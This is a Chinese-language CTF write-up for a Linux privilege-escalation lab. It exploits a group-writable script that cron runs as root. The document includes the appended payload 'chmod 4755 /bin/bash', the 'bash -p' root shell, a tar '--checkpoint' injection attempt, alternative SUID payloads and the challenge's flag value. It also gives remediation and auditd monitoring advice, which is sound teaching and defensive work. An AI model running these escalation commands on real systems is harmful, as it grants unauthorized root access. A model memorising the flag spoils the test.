## 二、题目考点

1. **计划任务要连“执行者 + 执行的文件 + 谁能改这个文件”一起看**。cron 行里的 `root` 只是执行身份，真正的风险在它执行的那个文件。
2. **`775 root:web` 的语义**：属主 root、属组 web、组内成员可写；而 `player` 恰好在 `web` 组里 —— “为了协作给组写权限”把 root 的执行链交了出去。
3. **文件权限 vs 目录权限**：`/opt/archive` 是 755，所以只能**改内容**（追加行）而不能删除/替换文件；这也解释了为什么“替换脚本”这条路走不通。
4. **SUID 作为落地方式**：脚本里加一行 `chmod 4755 /bin/bash`，等 cron 以 root 执行后就得到一个 SUID bash，用 `bash -p` 保住 euid。
5. **排干扰**：`/srv/uploads` 可写但 `run.sh` 里 `tar -czf ... /srv/uploads` 不带通配符、参数不被展开，`--checkpoint-action` 之类注入无效；`/etc/cron.d` 不可写。

## 三、解题过程

### 3.1 第一步：侦察提权面

```bash
id
# uid=1001(player) gid=1001(player) groups=1001(player),996(web)

ls -l /opt/archive/
# -rwxrwxr-x 1 root web 550 Nov 18 07:58 run.sh
```

注意到两点：`player` 在 `web` 组；`run.sh` 属组是 `web` 且组位是 `w`。

```bash
cat /etc/cron.d/archive
# # Archive uploads every minute (managed by ops)
# * * * * * root /opt/archive/run.sh

ls -ld /etc/cron.d /opt/archive
# drwxr-xr-x 1 root root 4096 /etc/cron.d
# drwxr-xr-x 1 root root 4096 /opt/archive
```

`/opt/archive/run.sh` 由 **root** 每分钟执行，而我能改它；目录不可写，所以只能改内容不能换文件。

```bash
ls -l /srv/uploads /flag.txt
# -rw-r--r-- 1 root root 16 report-0310.pdf
# -r-------- 1 root root 18 /flag.txt
```

### 3.2 第二步：排除其他路径（负向确认）

```bash
echo 'x' >> /etc/cron.d/archive
# bash: /etc/cron.d/archive: Permission denied

rm -f /opt/archive/run.sh
# rm: cannot remove '/opt/archive/run.sh': Permission denied

echo hi > /opt/archive/new.sh
# bash: /opt/archive/new.sh: Permission denied

touch /srv/uploads/--checkpoint=1
# 能建文件，但 tar 参数不被展开 -> 不会执行
```

四条旁路全部不成立，唯一入口是“往组可写脚本里追加一行”。

### 3.3 第三步：追加 payload，等 cron 执行

```bash
echo 'chmod 4755 /bin/bash' >> /opt/archive/run.sh

tail -3 /opt/archive/run.sh
# echo "[$(date '+%F %T')] archive job done" >> "$LOG"
# chmod 4755 /bin/bash

ls -l /bin/bash
# -rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash      <-- 还没有 s

# 等下一个整分钟（≤60s）
cat /var/log/archive.log | tail -2
# [2026-11-18 07:59:01] archive job start
# [2026-11-18 07:59:01] archive job done

ls -l /bin/bash
# -rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash      <-- SUID 已生效
```

### 3.4 第四步：用 SUID bash 取 root

```bash
/bin/bash -p -c 'id; cat /flag.txt'
# uid=1001(player) gid=1001(player) euid=0(root) groups=1001(player),996(web)
# Ly_Flag{prxdc2e7}
```

`-p` 让 bash 保留 SUID 带来的 euid（不加 `-p` 会被降权回 player）。拿到 euid=0 后 `cat /flag.txt` 即完成。

### 4.2 cron 是否真的在跑

```text
docker exec lx03 pgrep -a cron
61 /usr/sbin/cron

/var/log/archive.log
[2026-11-18 07:59:01] archive job start
[2026-11-18 07:59:01] archive job done
```

每分钟一对 start/done，说明 `/etc/cron.d/archive` 生效、脚本按 root 执行。日志文件由 root 创建、权限 0644，player 可读（这也是题目故意留的“确认执行”信号）。

### 4.3 唯一解性说明

| 其他思路 | 实测结果 |
| --- | --- |
| 改 `/etc/cron.d/archive` | 文件 644 root，目录 755 → Permission denied |
| 删除/替换 `run.sh` | 目录 755 root → Permission denied |
| 在 `/opt/archive` 新建脚本 | 目录不可写 → Permission denied |
| 上传目录注入 tar 参数（`--checkpoint=1`） | 能建文件，但 `run.sh` 中 `tar -czf /backup/uploads.tar.gz /srv/uploads` 不带通配符、参数不展开 → 不执行 |
| 预置 SUID 异常文件 | 镜像内除系统自带外无额外 SUID（`bash` 初始无 `s` 位，已在用例 8 前确认） |

### 4.4 flag 每题固定（flag.txt）
flag 是**每题一个固定值**：题目目录下的 `flag.txt` 由 Dockerfile `COPY` 到 `/flag.txt`，
再 `chown root:root && chmod 400`。十道题十份文件、内容互不相同；同一题多次构建、多个实例
取值都一致，评分不需要再按实例取 flag。

```bash
docker exec lx03 stat -c '%a %U:%G' /flag.txt   # 400 root:root
docker exec lx03 cat /flag.txt                    # Ly_Flag{prxdc2e7}
```

注意：flag 在构建时就写进镜像层，`docker save` 出来的 tar 同样带着它；若镜像/tar 会发给选手，
等于直接送出 flag，这种情况下应改为运行时挂载或环境变量注入。

## 六、修复建议

### 6.1 脚本权限（直接消除本题风险）

```bash
chown root:root /opt/archive/run.sh
chmod 755 /opt/archive/run.sh        # 或 700
```

要点：

- **root 执行的脚本不应可被任何非 root 主体写**，包括“属组写”。给组写权限等于给组内每个人 root 执行权。
- 目录权限要和文件权限一起看：目录 755 挡住了删除/替换，但挡不住“追加内容”，所以不能只盯目录。

### 6.2 用不可变/受控路径

- 脚本放到 root 独占目录（`/usr/local/sbin/`，755），文件 `root:root 0750`。
- 需要“运维可改”的脚本，走版本管理 + 配置下发，别让线上目录可写。
- 高价值环境可用 `chattr +i` 或只读 bind mount 把脚本钉死。

### 6.3 监控与审计

- 对 `root` 拥有的可执行文件做基线：`find / -xdev -type f -perm -o+w -user root`、`find / -xdev -perm -4000` 定期比对。
- cron 执行的脚本可用 `auditd` 监控 `chmod` / 文件写入事件（`-w /opt/archive -p wa`）。
- `/etc/cron.d` 目录应为 `root:root 0755`、文件 `0644`，任何可写都是一级警报。

### 6.4 构建侧

- `FROM ubuntu:24.04` 未固定 digest，建议 `ubuntu:24.04@sha256:…`。
- 交付标签用固定版本（如 `priv-lx03-cron-world:20261118`），避免 `latest` 漂移。

## 七、教学要点

1. 看到 cron 行，要追问三件事：谁执行（root）、执行什么文件、这个文件谁能改。
2. “组可写”是被低估的提权面：`775` 对 root 执行的脚本就是致命配置。
3. 文件可写但目录不可写 → 只能追加，不能替换；payload 要写成“脚本末尾能独立执行”的一行。
4. SUID 只是落地手段之一，也可以写 `cp /bin/bash /tmp/b; chmod 4755 /tmp/b`，或直接 `chmod 4755 /usr/bin/find`；核心始终是“让 root 替我改一个文件的属性”。
5. 拿到 SUID bash 后要加 `-p`：bash 检测到 euid≠ruid 默认会降权。
